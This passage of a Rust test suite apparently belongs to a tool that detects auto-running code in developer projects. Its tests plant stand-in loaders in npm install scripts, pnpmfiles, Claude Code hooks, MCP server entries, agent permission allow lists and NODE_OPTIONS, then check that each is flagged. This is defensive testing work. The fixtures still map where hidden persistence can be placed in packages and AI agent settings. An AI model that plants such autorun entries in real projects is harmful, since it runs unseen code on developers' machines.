        put(&there.join(".git/HEAD"), "ref: refs/heads/main\n");
        put(
            &there.join("package-lock.json"),
            &LOCK.replace("left-pad", "planted-pad"),
        );
        std::fs::remove_dir_all(e.home().join(replaced)).unwrap();
        link(spelled.to_str().unwrap(), &e.home().join(replaced));
        e.full();
        assert_eq!(e.coverage(CHECKOUTS_KIND), "full|", "{target}");
        assert_eq!(guarded(), before, "{target}");
        let named = e.rows(
            "SELECT id FROM entity WHERE id LIKE '%planted%'
             UNION ALL SELECT subject FROM assertion WHERE subject || object LIKE '%planted%'
             UNION ALL SELECT reason FROM coverage WHERE reason LIKE '%planted%'
             UNION ALL SELECT name FROM coverage_lack WHERE name LIKE '%planted%'",
        );
        assert!(
            named.iter().all(|n| n.contains("/Projects/shop")),
            "{target}: {named:?}"
        );
        assert_eq!(*target == "home", !named.is_empty(), "{target}");
        then(&e);
    }
}

#[test]
fn a_known_project_under_a_folder_a_link_replaced_is_closed_and_found_where_the_walk_reaches_it() {
    // Ids are paths of real folders: with a link above it, that path is no longer there.
    after_a_link_took_the_place_of("dev", true, |e| {
        assert_eq!(projects_removed(e), ["checkout:machine:mac/dev/shop"]);
        assert!(
            !e.found()
                .iter()
                .any(|(rule, at)| rule == "watched.git-hook" && at.contains("dev/shop")),
            "{:?}",
            e.found()
        );
    });
}

#[test]
fn a_known_project_whose_own_folder_a_link_replaced_is_kept_and_nothing_where_it_points_is_read() {
    after_a_link_took_the_place_of("dev/shop", false, |e| {
        assert_eq!(presence(e, "dev/shop"), "held");
        assert!(projects_removed(e).is_empty());
    });
}

#[test]
fn a_run_given_the_folder_above_the_home_folder_walks_the_home_folder_as_a_whole_run_does() {
    // The suite's home folder is under `/var`, a link on macOS: given the folder above it,
    // the walk meets the home folder by its real path and must know it by that path. It does
    // not enter Documents or the home folder's Library, holds each project once, and closes
    // one gone from the home folder.
    let e = Estate::new("above-home");
    e.checkout("dev/shop");
    let old = e.checkout("dev/old");
    e.checkout("Documents/src/app");
    e.checkout("Library/tools/app");
    e.run_in(&e.home().join("Documents/src"));
    e.full();
    std::fs::remove_dir_all(old).unwrap();
    // Shut, as macOS keeps it from a program it did not let in.
    let docs = e.home().join("Documents");
    mode(&docs, 0o000);
    e.run_in(&e.0);
    mode(&docs, 0o755);
    assert_eq!(
        projects_held(&e),
        [
            "checkout:machine:mac/Documents/src/app",
            "checkout:machine:mac/dev/shop"
        ]
    );
    assert_eq!(
        e.coverage(CHECKOUTS_KIND),
        "partial|only the given folder was walked"
    );
    assert_eq!(
        e.rows(
            "SELECT completeness || '|' || reason FROM coverage WHERE reader = 'checkouts'
               AND kind = 'folders macOS asks permission for' ORDER BY id DESC LIMIT 1"
        ),
        ["none|not looked into: ~/Documents"]
    );
}

#[test]
fn a_home_folder_under_git_is_never_taken_for_a_project_from_any_folder_a_run_is_given() {
    // Settings kept under git make the home folder a repository. A run given the folder
    // above it meets the home folder as one more folder; taking it for a project would have
    // every run after read the whole home folder.
    let e = Estate::new("home-under-git");
    e.checkout("dev/shop");
    put(&e.home().join(".git/HEAD"), "ref: refs/heads/main\n");
    put(&e.home().join("package-lock.json"), LOCK);
    e.run_in(&e.0);
    e.full();
    assert_eq!(projects_held(&e), ["checkout:machine:mac/dev/shop"]);
    assert!(part_of(&e, "left-pad").is_empty());
}

#[test]
fn a_run_pointed_at_a_project_whose_own_folder_a_link_replaced_loses_sight_of_its_hooks() {
    // In a folder macOS protects, which only a run given it enters, and outside the home
    // folder: the run pointed there looks as a whole run looks in the home folder.
    for documents in [true, false] {
        let e = Estate::new("pointed-link");
        e.checkout("dev/shop");
        let root = match documents {
            true => e.home().join("Documents/src"),
            false => e.0.join("elsewhere"),
        };
        let shop = root.join("shop");
        put(&shop.join(".git/HEAD"), "ref: refs/heads/main\n");
        put(&shop.join(".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n");
        e.full();
        e.run_in(&root);
        e.seen();
        let real = e.0.join("moved/shop");
        std::fs::create_dir_all(real.parent().unwrap()).unwrap();
        std::fs::rename(&shop, &real).unwrap();
        link(real.to_str().unwrap(), &shop);
        e.run_in(&root);
        assert_eq!(e.rules(), ["watched.git-hook"], "{}", root.display());
    }
}

#[test]
fn the_hooks_reading_does_not_look_inside_documents_for_a_known_project_there() {
    // Stored by a run pointed into Documents. Then a link takes its own folder's place: only
    // a look inside Documents could see that, and seeing it would make the hooks reading say
    // the project is there in another form and raise a finding for its hooks read before.
    let e = Estate::new("documents-hooks");
    e.checkout("dev/shop");
    let shop = e.checkout("Documents/src/shop");
    put(&shop.join(".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n");
    e.full();
    e.run_in(&e.home().join("Documents/src"));
    e.seen();
    let real = e.0.join("elsewhere/shop");
    std::fs::create_dir_all(real.parent().unwrap()).unwrap();
    std::fs::rename(&shop, &real).unwrap();
    link(real.to_str().unwrap(), &shop);
    e.full();
    assert!(e.found().is_empty(), "{:?}", e.found());
}

#[test]
fn a_known_project_whose_folder_above_is_now_a_file_is_closed_and_one_that_is_itself_a_file_kept() {
    // In a hidden folder the walk never enters; a run pointed there found both. A file where a
    // folder above was cannot hold a project; a file where the project was may be it in
    // another form, and is not looked into.
    let e = Estate::new("now-a-file");
    e.checkout("dev/shop");
    e.checkout(".work/a/proj");
    e.checkout(".work/b");
    e.run_in(&e.home().join(".work"));
    for rel in [".work/a", ".work/b"] {
        std::fs::remove_dir_all(e.home().join(rel)).unwrap();
        put(&e.home().join(rel), "");
    }
    e.full();
    assert_eq!(projects_removed(&e), ["checkout:machine:mac/.work/a/proj"]);
    assert_eq!(presence(&e, ".work/b"), "held");
    assert_eq!(e.coverage(CHECKOUTS_KIND), "full|");
}

#[test]
fn a_folder_that_cannot_be_listed_fails_the_reading_of_projects_with_no_known_project_in_it() {
    let e = Estate::new("unlisted-alone");
    e.checkout("dev/shop");
    let locked = e.home().join("dev/locked");
    std::fs::create_dir_all(&locked).unwrap();
    mode(&locked, 0o000);
    e.full();
    mode(&locked, 0o755);
    assert_eq!(
        e.coverage(CHECKOUTS_KIND),
        "partial|could not be listed: dev/locked"
    );
    assert_eq!(checkouts_cause(&e), "failed");
}

#[test]
fn ways_not_read_are_not_said_to_be_absent_from_projects_a_run_did_not_look_into() {
    let e = Estate::new("others-skipped");
    e.checkout("dev/shop");
    e.checkout("work/cli");
    e.run();
    let whole = || ["full||".to_string(), "full||".to_string()];
    assert_eq!(ways_held(&e, "dev/shop"), (Vec::new(), whole()));
    e.run_in(&e.home().join("work"));
    let skipped = "partial|not_given|known checkouts were not looked into".to_string();
    assert_eq!(
        ways_held(&e, "dev/shop"),
        (Vec::new(), [skipped.clone(), skipped])
    );
    // No checkout looked into: the home folder still was, the ways in checkouts were not.
    e.run_in(&e.home().join("missing"));
    let why = "failed|the checkout walk could not open its root folder";
    assert_eq!(
        ways_held(&e, "dev/shop"),
        (
            Vec::new(),
            [format!("partial|{why}"), format!("none|{why}")]
        )
    );
}

#[test]
fn a_skipped_project_leaves_the_home_folders_places_whole_and_a_file_not_read_a_failure() {
    let e = Estate::new("skipped-and-failed");
    e.checkout("dev/shop");
    e.checkout("work/cli");
    e.run();
    let cause = |kind: &str| {
        e.rows(&format!(
            "SELECT completeness, cause FROM coverage WHERE scope = 'machine:mac'
               AND kind = '{}' ORDER BY id DESC LIMIT 1",
            kind.replace('\'', "''")
        ))
        .concat()
    };
    put(&e.home().join("work/cli/.vscode/tasks.json"), "{not json");
    e.run_in(&e.home().join("work"));
    assert_eq!(cause(TASKS_KIND), "none|failed");
    let home = "~/.claude/settings.json, the part that runs by itself";
    assert_eq!(cause(home), "full|");
}

#[test]
fn a_place_in_the_home_folder_is_never_counted_as_a_way_present_in_projects() {
    let e = Estate::new("home-not-projects");
    e.checkout("dev/shop");
    put(&e.home().join(".codex/config.toml"), "model = \"x\"\n");
    e.full();
    assert_eq!(e.coverage(OTHERS_KIND), "full|");
}

/// What the status's item on the ways a project runs code by itself that are not read means.
fn ways_meaning(e: &Estate) -> String {
    let status = e.status();
    let mut items = status["not_covered"].as_array().unwrap().iter();
    let item = items.find(|u| u["id"] == "project-autorun").unwrap();
    item["meaning"].as_str().unwrap().to_string()
}

const NONE_WHOLE: &str = "None of the others is present in your projects now.";
/// What the status adds, before why, while not every project was looked into.
const NOT_EVERY: &str =
    "Not every project was looked at, so the projects not looked at may hold some.";
const NONE_PART: &str = "None of the others is present in the projects that were looked at. Not every project was looked at, so the projects not looked at may hold some.";

#[test]
fn the_status_says_no_way_not_read_is_in_projects_only_when_every_known_project_was_looked_into() {
    let e = Estate::new("ways-said");
    e.checkout("dev/shop");
    let tool = e.home().join(".config/tool");
    put(&tool.join(".git/HEAD"), "ref: refs/heads/main\n");
    let sessions = e.0.join("sessions");
    session(&e, "tool", &tool);
    e.go(None, &sessions);
    assert_eq!(ways_meaning(&e), NONE_WHOLE);
    // A walk that could not open its root folder, after a whole one.
    e.run_with(&e.home().join("missing"), &sessions);
    let why = "the checkout walk could not open its root folder";
    assert_eq!(ways_meaning(&e), format!("{NONE_PART} Why: {why}."));
    e.go(None, &sessions);
    assert_eq!(ways_meaning(&e), NONE_WHOLE);
    // Sessions that could not be read: the project only they lead to was not looked into.
    use std::os::unix::fs::PermissionsExt;
    let mode = |m| std::fs::set_permissions(&sessions, std::fs::Permissions::from_mode(m));
    mode(0o000).unwrap();
    e.go(None, &sessions);
    mode(0o755).unwrap();
    let why = "known checkouts were not looked into";
    assert_eq!(ways_meaning(&e), format!("{NONE_PART} Why: {why}."));
    e.go(None, &sessions);
    assert_eq!(ways_meaning(&e), NONE_WHOLE);
}

/// The cells of the page's table of ways a project runs code by itself, as file and projects.
fn ways_here(e: &Estate) -> Vec<(String, String)> {
    let page = e.this_mac_page();
    let section = section(&page, "ways-code-runs");
    let cell = |c: &str| c[c.find('>').unwrap() + 1..c.find("</td>").unwrap()].to_string();
    let row = |r: &str| {
        let cells: Vec<String> = r.split("<td").skip(1).map(cell).collect();
        (cells[0].clone(), cells[4].clone())
    };
    section.split("<tr>").skip(2).map(row).collect()
}

#[test]
fn the_page_counts_no_project_as_holding_none_of_a_way_when_not_every_project_was_looked_into() {
    let e = Estate::new("ways-page");
    package(&e.checkout("dev/shop"), "");
    e.run_in(&e.home().join("missing"));
    let page = e.this_mac_page();
    let ways = section(&page, "ways-code-runs");
    assert!(
        ways.contains("the checkout walk could not open its root folder"),
        "{ways}"
    );
    assert!(ways_here(&e).iter().all(|(_, n)| n != "0"));
    // The places of the home folder do not rest on projects.
    let home = section(&page, "home-code-runs");
    assert!(!home.contains("Not every project"), "{home}");
    e.full();
    let page = e.this_mac_page();
    assert!(!page.contains("Not every project"), "{page}");
    let here = ways_here(&e);
    assert!(here.contains(&("package.json".to_string(), "1".to_string())));
    assert!(here.contains(&(".mcp.json".to_string(), "0".to_string())));
}

/// What the page's table says of one way in projects here.
fn way_here(e: &Estate, file: &str) -> String {
    let here = ways_here(e).into_iter().find(|(f, _)| f == file);
    here.unwrap().1
}

fn mode(path: &Path, mode: u32) {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap();
}

const ONE_NOT_READ: &str = "1 of the others are present in your projects and are not read, so a change in them would go unseen.";

#[test]
fn no_way_is_said_absent_from_projects_while_the_sessions_that_lead_to_projects_could_not_be_read()
{
    let e = Estate::new("finder-failed");
    e.checkout("dev/shop");
    let tool = e.0.join("elsewhere/tool");
    put(&tool.join(".git/HEAD"), "ref: refs/heads/main\n");
    put(&tool.join(".npmrc"), "ignore-scripts=false\n");
    package(&tool, "");
    let sessions = e.0.join("sessions");
    session(&e, "tool", &tool);
    mode(&sessions, 0o000);
    e.go(None, &sessions);
    mode(&sessions, 0o755);
    let why = "the reading of checkouts in agent working folders was not full";
    assert_eq!(ways_meaning(&e), format!("{NONE_PART} Why: {why}."));
    assert_eq!(way_here(&e, "package.json"), "Not known");
    e.go(None, &sessions);
    assert_eq!(ways_meaning(&e), ONE_NOT_READ);
    assert_eq!(way_here(&e, "package.json"), "1");
}

#[test]
fn no_way_is_said_absent_from_projects_while_one_session_file_could_not_be_read() {
    let e = Estate::new("finder-partial");
    let shop = e.checkout("dev/shop");
    let sessions = e.0.join("sessions");
    session(&e, "shop", &shop);
    e.go(None, &sessions);
    assert_eq!(ways_meaning(&e), NONE_WHOLE);
    let other = e.0.join("elsewhere/other");
    put(&other.join(".git/HEAD"), "ref: refs/heads/main\n");
    put(&other.join(".envrc"), "use flake\n");
    package(&other, "");
    session(&e, "other", &other);
    let file = sessions.join("other/session.jsonl");
    mode(&file, 0o000);
    e.go(None, &sessions);
    mode(&file, 0o644);
    let why = "the reading of checkouts in agent working folders was not full";
    assert_eq!(ways_meaning(&e), format!("{NONE_PART} Why: {why}."));
    assert_eq!(way_here(&e, "package.json"), "Not known");
    e.go(None, &sessions);
    assert_eq!(ways_meaning(&e), ONE_NOT_READ);
    assert_eq!(way_here(&e, "package.json"), "1");
}

#[test]
fn a_count_of_ways_not_read_says_there_may_be_more_while_not_every_project_was_looked_into() {
    let e = Estate::new("maybe-more");
    put(
        &e.checkout("dev/shop").join(".npmrc"),
        "ignore-scripts=false\n",
    );
    e.full();
    put(&e.checkout("dev/new").join("bunfig.toml"), "preload = []\n");
    e.run_in(&e.home().join("missing"));
    let why = "the checkout walk could not open its root folder";
    assert_eq!(
        ways_meaning(&e),
        format!("{ONE_NOT_READ} {NOT_EVERY} Why: {why}.")
    );
    e.full();
    assert_eq!(
        ways_meaning(&e),
        "2 of the others are present in your projects and are not read, so a change in them would go unseen."
    );
}

/// A project's `package.json` with these scripts.
fn package(c: &Path, scripts: &str) {
    put(
        &c.join("package.json"),
        &format!(
            "{{\n  \"name\": \"shop\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {{{scripts}}}\n}}\n"
        ),
    );
}

/// Settings of Claude Code for a project, with this more.
fn agent(c: &Path, more: &str) {
    put(
        &c.join(".claude/settings.json"),
        &format!("{{\"permissions\": {{\"deny\": [\"Read(./.env)\"]}}{more}}}"),
    );
}

const HOOK: &str = r#", "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "node .invented/start-91c2.js"}]}]}"#;
const SERVER: &str =
    r#"{"mcpServers": {"helper": {"command": "npx", "args": ["-y", "invented-helper-5d0e"]}}}"#;

fn pair(rule: &str, place: &str) -> (String, String) {
    (rule.to_string(), place.to_string())
}

#[test]
fn pnpmfiles_at_checkout_roots_are_baselined_and_later_compared_byte_for_byte() {
    let e = Estate::new("pnpm-roots");
    let shop = e.checkout("dev/shop");
    let cli = e.checkout("dev/cli");
    let hooks: [(&str, &[u8]); 2] = [
        (".pnpmfile.cjs", b"module.exports = {} // \xff\n"),
        (".pnpmfile.mjs", b"export const hooks = {} // \xff\n"),
    ];
    for (name, bytes) in hooks {
        std::fs::write(shop.join(name), bytes).unwrap();
    }
    e.run();
    assert!(e.found().is_empty());
    assert_eq!(e.coverage(PNPM_KIND), "full|");

    put(
        &shop.join("pnpm-workspace.yaml"),
        "packages: ['packages/*']\nsharedWorkspaceLockfile: false\n",
    );
    put(
        &shop.join("packages/cart/.pnpmfile.mjs"),
        "export const hooks = {}\n",
    );
    for (name, bytes) in hooks {
        std::fs::write(cli.join(name), bytes).unwrap();
        std::fs::write(shop.join(name), bytes).unwrap();
    }
    let findings_at = |checkout| {
        hooks.map(|(name, _)| {
            pair(
                "autorun.package-install",
                &format!("~/dev/{checkout}/{name}"),
            )
        })
    };
    e.run();
    assert_eq!(e.found(), findings_at("cli"));
    assert!(e.lacks(OTHERS_KIND).is_empty());

    // Both byte values decode to the same replacement character in lossy UTF-8.
    e.seen();
    let digests = hooks.map(|(name, before)| {
        let after = [before.strip_suffix(b"\xff\n").unwrap(), b"\xfe\n"].concat();
        std::fs::write(shop.join(name), &after).unwrap();
        format!(
            "file:machine:mac/dev/shop/{name}|sha256:{}|sha256:{}",
            sha256_of(before),
            sha256_of(after)
        )
    });
    e.run();
    assert_eq!(e.found(), findings_at("shop"));
    assert_eq!(
        e.rows(
            "SELECT subject, old_value, new_value FROM journal
             WHERE entry = 'changed' AND predicate = 'has_content'
               AND subject LIKE '%.pnpmfile.%' ORDER BY subject"
        ),
        digests
    );
}

#[test]
fn an_unavailable_walk_leaves_pnpm_coverage_incomplete_even_without_previously_known_checkouts() {
    let e = Estate::new("pnpm-no-walk");
    e.run();
    let shop = e.checkout("dev/shop");
    put(&shop.join(".pnpmfile.cjs"), "module.exports = {}\n");
    let missing = e.home().join("missing");
    let reason = "the checkout walk could not open its root folder";
    e.run_in(&missing);
    assert_eq!(e.coverage(PNPM_KIND), format!("none|{reason}"));

    session(&e, "shop", &shop);
    e.run_with(&missing, &e.0.join("sessions"));
    assert_eq!(e.coverage(PNPM_KIND), format!("partial|{reason}"));
}

#[test]
fn a_planted_install_script_and_a_planted_agent_hook_are_findings_and_their_removal_is_not() {
    // The incident's uncaught step and ChainDrop's: a script a package manager runs on
    // install, a hook and a server an agent starts. Each is found by the rule of what runs it
    // and named by its file and key; what else changes in those files is not read.
    let e = Estate::new("planted");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"test\": \"jest\"");
    agent(&shop, "");
    put(&shop.join(".mcp.json"), "{\"mcpServers\": {}}");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    package(
        &shop,
        "\"test\": \"jest\", \"prepare\": \"node .invented/loader-7f3a.js\"",
    );
    agent(&shop, HOOK);
    put(&shop.join(".mcp.json"), SERVER);
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-start",
                "~/dev/shop/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/shop/.mcp.json#/mcpServers/helper"
            ),
            pair(
                "autorun.package-install",
                "~/dev/shop/package.json#/scripts/prepare"
            ),
        ]
    );

    // What runs only when asked, and keys no tool runs, change: nothing to say.
    e.seen();
    put(
        &shop.join("package.json"),
        "{\"name\": \"shop\", \"version\": \"1.1.0\", \"scripts\": {\"prepare\": \"node .invented/loader-7f3a.js\", \"test\": \"jest --ci\"}}",
    );
    agent(&shop, &format!("{HOOK}, \"model\": \"opus\""));
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    // Taken out: they leave what is watched, and that is nothing to find.
    package(&shop, "\"test\": \"jest\"");
    agent(&shop, "");
    put(&shop.join(".mcp.json"), "{\"mcpServers\": {}}");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    assert!(
        e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live' AND predicate = 'watched_as'
               AND subject LIKE '%#/%'"
        )
        .is_empty()
    );
}

/// Every finding, open or not, as rule, where, state, severity and confidence, sorted.
fn levelled(e: &Estate) -> Vec<[String; 5]> {
    let s = |v: &serde_json::Value| v.as_str().unwrap_or_default().to_string();
    let mut found: Vec<[String; 5]> = e.contract(&["findings"])["findings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|item| {
            let f = &item["finding"];
            [
                &f["rule"],
                &item["where_text"],
                &f["state"],
                &f["severity"],
                &f["confidence"],
            ]
            .map(s)
        })
        .collect();
    found.sort();
    found
}

/// A finding as `levelled` gives it, open, with `severity/confidence`.
fn open_at(rule: &str, place: &str, levels: &str) -> [String; 5] {
    let (severity, confidence) = levels.split_once('/').unwrap();
    [rule, place, "open", severity, confidence].map(str::to_string)
}

const URGENT: &str = "high/medium";

/// A project's local settings for Claude Code with this allow value.
fn local_allow(c: &Path, allow: &str) {
    put(
        &c.join(".claude/settings.local.json"),
        &format!("{{\"permissions\": {{\"allow\": {allow}}}}}"),
    );
}

/// Whether the journal after `seq` closed or retired anything.
fn closed_after(e: &Estate, seq: i64) -> Vec<String> {
    e.rows(&format!(
        "SELECT entry || ' ' || subject FROM journal
         WHERE seq > {seq} AND entry IN ('removed', 'retired', 'finding_cleared')"
    ))
}

#[test]
fn an_allow_entry_in_local_agent_settings_is_its_own_finding_at_medium_and_low_while_one_in_shared_settings_and_a_local_hook_stay_urgent()
 {
    // Claude Code writes an allow entry into a project's local settings itself, each time its
    // user chooses not to be asked again: told at once, each would be answered unread. The
    // same entry in the shared settings came with the repository, and a hook runs code.
    let e = Estate::new("agent-allowed");
    let shop = e.checkout("dev/shop");
    agent(&shop, "");
    local_allow(&shop, "[\"Bash(make:*)\"]");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    // One more entry, as the agent adds it to the list; the sample of the rule adds a first.
    let allow = "[\"Bash(make:*)\", \"Bash(npm test:*)\"]";
    put(
        &shop.join(".claude/settings.json"),
        &format!("{{\"permissions\": {{\"deny\": [\"Read(./.env)\"], \"allow\": {allow}}}}}"),
    );
    put(
        &shop.join(".claude/settings.local.json"),
        &format!("{{\"permissions\": {{\"allow\": {allow}}}{HOOK}}}"),
    );
    e.run();
    let local = "~/dev/shop/.claude/settings.local.json";
    assert_eq!(
        levelled(&e),
        [
            open_at(
                "autorun.agent-allowed",
                &format!("{local}#/permissions/allow"),
                "medium/low"
            ),
            open_at(
                "autorun.agent-start",
                "~/dev/shop/.claude/settings.json#/permissions/allow",
                URGENT
            ),
            open_at("autorun.agent-start", &format!("{local}#/hooks"), URGENT),
        ]
    );
}

/// The project's local settings moved to `elsewhere`, with a link left in their place.
fn local_to_link(shop: &Path, elsewhere: &Path) {
    std::fs::create_dir_all(elsewhere.parent().unwrap()).unwrap();
    std::fs::rename(shop.join(".claude/settings.local.json"), elsewhere).unwrap();
    link(
        elsewhere.to_str().unwrap(),
        &shop.join(".claude/settings.local.json"),
    );
}

const ALLOW_PART: &str = "~/dev/shop/.claude/settings.local.json#/permissions/allow";

#[test]
fn local_agent_settings_replaced_by_a_link_to_the_same_bytes_or_turned_back_into_a_file_raise_the_urgent_rule_not_the_lower_one()
 {
    // Where the file leads changed, not the list: that is told by the rule of the file.
    let e = Estate::new("agent-allowed-link");
    let shop = e.checkout("dev/shop");
    local_allow(&shop, "[\"Bash(make:*)\"]");
    e.run();
    let before = e.last_entry();
    let elsewhere = e.home().join(".invented/settings.local.json");
    local_to_link(&shop, &elsewhere);
    e.run();
    // One finding of the urgent rule, and nothing closed on the way.
    assert_eq!(
        levelled(&e),
        [open_at("autorun.agent-start", ALLOW_PART, URGENT)]
    );
    assert!(
        closed_after(&e, before).is_empty(),
        "{:?}",
        closed_after(&e, before)
    );

    e.seen();
    std::fs::remove_file(shop.join(".claude/settings.local.json")).unwrap();
    std::fs::rename(&elsewhere, shop.join(".claude/settings.local.json")).unwrap();
    e.run();
    let open: Vec<[String; 5]> = levelled(&e)
        .into_iter()
        .filter(|f| f[2] == "open")
        .collect();
    assert_eq!(open, [open_at("autorun.agent-start", ALLOW_PART, URGENT)]);
}

#[test]
fn an_allow_list_that_arrives_through_a_link_raises_the_urgent_rule() {
    // The list is new and is told by its own kind; that the file now leads elsewhere is told
    // by the rule of the file, though the entry it is seen on is new in the same run.
    let e = Estate::new("agent-allowed-arrives-linked");
    let shop = e.checkout("dev/shop");
    put(&shop.join(".claude/settings.local.json"), "{}");
    e.run();
    let elsewhere = e.home().join(".invented/settings.local.json");
    local_to_link(&shop, &elsewhere);
    put(&elsewhere, "{\"permissions\": {\"allow\": [\"Read\"]}}");
    e.run();
    assert_eq!(
        levelled(&e),
        [
            open_at("autorun.agent-allowed", ALLOW_PART, "medium/low"),
            open_at("autorun.agent-start", ALLOW_PART, URGENT),
        ]
    );
}

#[test]
fn the_list_changed_in_local_agent_settings_reached_through_a_link_raises_the_lower_rule() {
    // What is lowered is a change of the list, however the file is reached.
    let e = Estate::new("agent-allowed-through-link");
    let shop = e.checkout("dev/shop");
    local_allow(&shop, "[\"Bash(make:*)\"]");
    let elsewhere = e.home().join(".invented/settings.local.json");
    local_to_link(&shop, &elsewhere);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    put(
        &elsewhere,
        "{\"permissions\": {\"allow\": [\"Bash(make:*)\", \"Bash(npm test:*)\"]}}",
    );
    e.run();
    assert_eq!(
        levelled(&e),
        [open_at("autorun.agent-allowed", ALLOW_PART, "medium/low")]
    );
}

#[test]
fn an_allow_value_that_is_a_string_an_object_or_a_list_holding_an_object_raises_the_urgent_rule() {
    // Only a list of strings is the lower kind; any other shape is the row's, whatever an
    // entry means.
    let e = Estate::new("agent-allowed-shape");
    let shapes = [
        ("a", "\"Read\""),
        (
            "b",
            "{\"env\": {\"NODE_OPTIONS\": \"--require ./.invented/x.js\"}}",
        ),
        ("c", "[\"Bash(make:*)\", {\"hooks\": {\"Stop\": []}}]"),
    ];
    for (c, _) in shapes {
        local_allow(&e.checkout(&format!("dev/{c}")), "[\"Bash(make:*)\"]");
    }
    e.run();
    let before = e.last_entry();
    for (c, allow) in shapes {
        local_allow(&e.home().join(format!("dev/{c}")), allow);
    }
    e.run();
    let part = |c: &str| format!("~/dev/{c}/.claude/settings.local.json#/permissions/allow");
    assert_eq!(
        levelled(&e),
        shapes.map(|(c, _)| open_at("autorun.agent-start", &part(c), URGENT))
    );
    assert!(
        closed_after(&e, before).is_empty(),
        "{:?}",
        closed_after(&e, before)
    );
}

#[test]
fn the_text_of_a_script_or_a_command_is_never_kept_printed_or_returned() {
    // A script is code someone else wrote: kept, it could be read as an instruction, and it
    // may hold a token. Only its checksum is kept.
    let e = Estate::new("no-text");
    let shop = e.checkout("dev/shop");
    e.run();
    package(&shop, "\"postinstall\": \"node .invented/loader-7f3a.js\"");
    let cjs = "require('node:fs').writeFileSync(__filename + '.ran', 'pnpm-canary-801f');\nmodule.exports = {}\n";
    put(&shop.join(".pnpmfile.cjs"), cjs);
    agent(&shop, HOOK);
    put(&shop.join(".mcp.json"), SERVER);
    let mut said = e.run();
    said.push_str(&e.status().to_string());
    said.push_str(&format!("{:?}", e.findings(true)));
    assert_eq!(e.rules().len(), 4, "{said}");
    assert_eq!(
        std::fs::read_to_string(shop.join(".pnpmfile.cjs")).unwrap(),
        cjs
    );
    assert!(!shop.join(".pnpmfile.cjs.ran").exists());
    let mut kept = std::fs::read(e.store()).unwrap();
    for file in walk(&e.0.join("raw")) {
        kept.extend(std::fs::read(file).unwrap());
    }
    for text in [
        "loader-7f3a",
        "pnpm-canary-801f",
        "start-91c2",
        "invented-helper-5d0e",
    ] {
        assert!(!said.contains(text), "{text}: {said}");
        assert!(
            !kept.windows(text.len()).any(|w| w == text.as_bytes()),
            "{text} is in the store"
        );
    }
}

/// Every file under a folder.
fn walk(dir: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir).into_iter().flatten().flatten() {
        let path = entry.path();
        if path.is_dir() {
            out.extend(walk(&path));
        } else {
            out.push(path);
        }
    }
    out
}

#[test]
fn a_file_that_cannot_be_read_by_key_faithfully_is_read_whole_and_is_never_unchanged() {
    // The false calm: a benign script where one tool looks and a planted one where another
    // does. Read by key it could look unchanged; read whole, any change is one.
    let e = Estate::new("whole");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"prepare\": \"husky\"");
    e.run();
    let kind = "package.json of each checkout, the part that runs by itself";
    assert_eq!(e.coverage(kind), "full|");
    package(
        &shop,
        "\"prepare\": \"node .invented/loader-7f3a.js\", \"prepare\": \"husky\"",
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair("autorun.package-install", "~/dev/shop/package.json")]
    );
    assert_eq!(
        e.coverage(kind),
        "full|read whole, not by key: dev/shop/package.json (two equal keys that tools read differently)"
    );
    // A byte order mark, and a file that is not strict JSON, are read whole too, and say why.
    e.seen();
    put(&shop.join("package.json"), "\u{feff}{\"scripts\": {}}");
    put(
        &e.checkout("dev/blog").join("package.json"),
        "{\"scripts\": {},}",
    );
    e.run();
    let coverage = e.coverage(kind);
    assert!(
        coverage.contains("dev/blog/package.json (not strict JSON: ")
            && coverage.contains("dev/shop/package.json (starts with a byte order mark"),
        "{coverage}"
    );
    assert_eq!(
        e.found(),
        [
            pair("autorun.package-install", "~/dev/blog/package.json"),
            pair("autorun.package-install", "~/dev/shop/package.json"),
        ]
    );
}

#[test]
fn an_agents_file_with_comments_is_read_by_key_so_an_edit_elsewhere_is_no_finding_and_equal_keys_are()
 {
    // Cursor's and Gemini CLI's files are JSON with comments. Read by key, what changes
    // around their servers is nothing to find; a server added is. Two equal keys are read
    // whole, so the one a tool may read is never taken as unchanged.
    let e = Estate::new("comments");
    let shop = e.checkout("dev/shop");
    let cursor = |more: &str| {
        put(
            &shop.join(".cursor/mcp.json"),
            &format!(
                "{{\n  // ours\n  \"mcpServers\": {{\"helper\": {{\"command\": \"npx\"{more}}},}},\n}}\n"
            ),
        )
    };
    let gemini = |theme: &str, servers: &str| {
        put(
            &shop.join(".gemini/settings.json"),
            &format!(
                "{{\n  /* {theme} */ \"ui\": {{\"theme\": \"{theme}\"}},\n  \"mcpServers\": {{{servers}}}\n}}\n"
            ),
        )
    };
    cursor("");
    gemini("dark", "");
    e.run();
    let kind = ".cursor/mcp.json of each checkout, the part that runs by itself";
    assert_eq!(e.coverage(kind), "full|");
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    put(
        &shop.join(".cursor/mcp.json"),
        "{\"mcpServers\": {\"helper\": {\"command\": \"npx\"}}, \"note\": \"edited\" /* again */}",
    );
    gemini("light", "");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));

    gemini(
        "light",
        "\"x\": {\"command\": \"node .invented/x-4b1e.js\"}",
    );
    cursor(", \"command\": \"node .invented/x-4b1e.js\", \"command\": \"npx\"");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair("autorun.agent-start", "~/dev/shop/.cursor/mcp.json"),
            pair(
                "autorun.agent-start",
                "~/dev/shop/.gemini/settings.json#/mcpServers/x"
            ),
        ]
    );
